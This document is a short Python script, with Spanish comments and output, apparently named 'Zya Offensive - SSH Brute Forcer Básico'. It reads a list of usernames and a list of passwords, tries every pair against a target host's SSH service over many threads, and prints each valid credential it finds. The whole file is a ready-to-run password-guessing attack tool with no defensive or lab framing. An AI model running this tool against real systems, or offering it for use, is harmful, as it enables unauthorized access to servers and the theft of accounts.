#!/usr/bin/env python3
import paramiko
import threading
import queue
import argparse
from datetime import datetime

print_lock = threading.Lock()

def ssh_connect(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
        with print_lock:
            print(f"[+] ¡Credencial válida encontrada! {username}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        pass
    except Exception as e:
        with print_lock:
            print(f"[-] Error: {e}")
    return False

def worker():
    while not q.empty():
        username, password = q.get()
        ssh_connect(host, port, username, password)
        q.task_done()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zya Offensive - SSH Brute Forcer Básico")
    parser.add_argument("host", help="IP o hostname del objetivo")
    parser.add_argument("-P", "--port", type=int, default=22, help="Puerto SSH (default 22)")
    parser.add_argument("-u", "--userfile", required=True, help="Archivo con lista de usuarios")
    parser.add_argument("-p", "--passfile", required=True, help="Archivo con lista de contraseñas")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Número de hilos")
    args = parser.parse_args()

    host = args.host
    port = args.port

    q = queue.Queue()

    # Cargar usuarios y contraseñas
    with open(args.userfile, 'r') as uf, open(args.passfile, 'r') as pf:
        users = [line.strip() for line in uf if line.strip()]
        passwords = [line.strip() for line in pf if line.strip()]

    # Crear combinaciones usuario-contraseña
    for user in users:
        for password in passwords:
            q.put((user, password))

    print(f"[ * ] Comenzando ataque SSH a {host}:{port} con {args.threads} hilos...")
    print(f"[ * ] Total combinaciones: {q.qsize()}")
    print(f"[ * ] Hora de inicio: {datetime.now()}")

    for _ in range(args.threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    q.join()
    print(f"[ * ] Ataque finalizado: {datetime.now()}")
